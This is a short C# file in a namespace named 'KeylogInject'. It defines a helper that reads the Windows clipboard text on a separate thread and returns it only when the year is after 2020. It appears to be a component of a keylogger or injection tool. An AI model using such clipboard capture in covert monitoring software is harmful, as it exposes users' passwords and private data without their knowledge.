using System.Threading;

namespace KeylogInject
{
    static class Clipboard
    {
        public static string GetText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                    
                    
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            if(DateTime.Now.Year > 2020) { return ReturnValue; } else { return null; }
        }
    }
}
